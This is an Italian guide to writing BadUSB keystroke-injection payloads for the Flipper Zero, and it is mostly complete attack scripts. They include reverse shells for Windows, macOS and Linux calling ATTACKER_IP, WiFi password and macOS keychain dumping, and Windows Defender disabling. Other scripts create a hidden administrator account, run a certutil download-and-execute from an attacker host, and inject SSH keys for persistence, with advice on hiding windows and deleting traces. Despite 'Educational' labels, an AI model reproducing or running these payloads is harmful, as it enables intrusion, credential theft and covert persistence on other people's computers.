# BadUSB Script - Guida alla Creazione di Payload

Guida completa alla scrittura, struttura e ottimizzazione degli script BadUSB (DuckyScript) per il Flipper Zero, con tecniche avanzate per ogni sistema operativo e scenari di utilizzo reali.

---

## Struttura di un Payload

Ogni script BadUSB è un file `.txt` salvato in `/ext/badusb/` sulla SD card del Flipper. Il formato è DuckyScript 1.0 con estensioni Flipper.

### Template Base

```
REM ===================================
REM Nome: [Nome del Payload]
REM Target OS: [Windows/macOS/Linux]
REM Layout: [IT/US/UK/DE]
REM Versione: [1.0]
REM Descrizione: [Cosa fa il payload]
REM ===================================

REM Configurazione timing
DEFAULT_DELAY 100

REM === FASE 1: Apertura Terminale ===
[comandi per aprire terminale/powershell]

REM === FASE 2: Esecuzione ===
[payload principale]

REM === FASE 3: Pulizia ===
[chiusura finestre, cancellazione tracce]
```

### Best Practice per la Scrittura

**Delay strategici:**
- Dopo `GUI r` (Run dialog): 500-1000ms
- Dopo `ENTER` su un comando: 200-500ms
- Dopo `CTRL-SHIFT ENTER` (UAC): 1500-2000ms
- Dopo `ALT y` (conferma UAC): 500ms
- Dopo apertura terminale: 500-1000ms
- Su macchine lente/VM: raddoppia tutti i delay

**Gestione errori:**
- Non fidarti che il comando precedente sia andato a buon fine
- Aggiungi delay generosi prima di comandi dipendenti
- Usa `WAIT_FOR_BUTTON_PRESS` prima della parte critica se hai tempo

**Layout tastiera:**
- Testa SEMPRE con lo stesso layout del target
- Per caratteri problematici usa `ALTCHAR` (Alt code)
- Caratteri critici IT vs US: @ (AltGr+Q vs Shift+2), # (AltGr+a vs Shift+3), \ (diversa posizione)

---

## Payload per Windows

### Reverse Shell PowerShell (Educational)

```
REM Reverse Shell PS - Educational PoC
REM Target: Windows 10/11
REM Layout: IT
DEFAULT_DELAY 150

GUI r
DELAY 700
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1200

STRING $c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
ENTER
```

### Exfiltration Credenziali WiFi

```
REM WiFi Cred Exfil - Educational
REM Target: Windows 10/11 IT
DEFAULT_DELAY 100

GUI r
DELAY 700
STRING cmd /k
ENTER
DELAY 800

STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profilo"') do @(for /f "tokens=2 delims=:" %b in ('netsh wlan show profile name^="%a" key^=clear ^| findstr "Contenuto"') do @echo %a:%b) >> %TEMP%\w.log
ENTER
DELAY 3000

STRING type %TEMP%\w.log
ENTER
DELAY 500

REM Pulizia
STRING del %TEMP%\w.log && exit
ENTER
```

### Disabilitazione Defender (richiede Admin)

```
REM Disable Defender - Admin Required
DEFAULT_DELAY 150

GUI
DELAY 500
STRING powershell
DELAY 300
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 800

STRING Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER
```

### Creazione Utente Admin Nascosto

```
REM Hidden Admin User - Educational
DEFAULT_DELAY 150

GUI r
DELAY 700
STRING cmd
DELAY 200
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 800

STRING net user support_svc P@ssw0rd! /add
ENTER
DELAY 500
STRING net localgroup administrators support_svc /add
ENTER
DELAY 500
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v support_svc /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING exit
ENTER
```

### Download & Execute via Certutil (LOLBin)

```
REM Download via certutil - LOLBin
DEFAULT_DELAY 100

GUI r
DELAY 700
STRING cmd /c certutil -urlcache -split -f http://ATTACKER/payload.exe %TEMP%\svc.exe && start %TEMP%\svc.exe
ENTER
```

---

## Payload per macOS

### Reverse Shell Bash

```
REM macOS Reverse Shell - Educational
DEFAULT_DELAY 150

GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000

STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 300
STRING exit
ENTER
```

### Exfiltration Keychain (richiede password utente)

```
REM macOS Keychain Dump - Requires Password
DEFAULT_DELAY 150

GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000

STRING security dump-keychain -d login.keychain 2>/dev/null | grep -A3 "class: genp" > /tmp/kc.log
ENTER
DELAY 2000
STRING cat /tmp/kc.log
ENTER
```

---

## Payload per Linux

### Reverse Shell Python

```
REM Linux Reverse Shell Python - Educational
DEFAULT_DELAY 100

CTRL-ALT t
DELAY 800

STRING python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' &
ENTER
DELAY 300
STRING exit
ENTER
```

### SSH Key Injection (Persistenza)

```
REM SSH Key Inject - Persistence
DEFAULT_DELAY 100

CTRL-ALT t
DELAY 800

STRING mkdir -p ~/.ssh && echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY... pentest@target" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ENTER
DELAY 300
STRING exit
ENTER
```

---

## Tecniche Avanzate

### ALTSTRING per Indipendenza dal Layout

Il comando `ALTSTRING` digita caratteri usando Alt code (numpad), bypassando completamente il layout della tastiera. Fondamentale quando non conosci il layout del target:

```
REM Usa ALTSTRING per @ indipendentemente dal layout
ALTSTRING powershell
```

### WAIT_FOR_BUTTON_PRESS per Timing Manuale

```
REM Aspetta il momento giusto
STRING Script pronto. Premi il pulsante quando il PC è sbloccato.
WAIT_FOR_BUTTON_PRESS
REM Da qui parte il payload vero
GUI r
...
```

### Combinazione BadUSB + Mass Storage

Tecnica a due fasi:
1. Il Flipper copia un file dalla sua SD card al PC via Mass Storage
2. Il BadUSB esegue il file copiato

Vantaggi: il payload può essere un eseguibile complesso che non è possibile "digitare".

> **Nota personale:** La combinazione BadUSB + Mass Storage è la più potente. Il BadUSB digita un comando per copiare il file dal Flipper (riconosciuto come chiavetta USB) ed eseguirlo. Due modalità USB in sequenza che richiedono switch manuale, ma il risultato è molto più flessibile del solo HID.
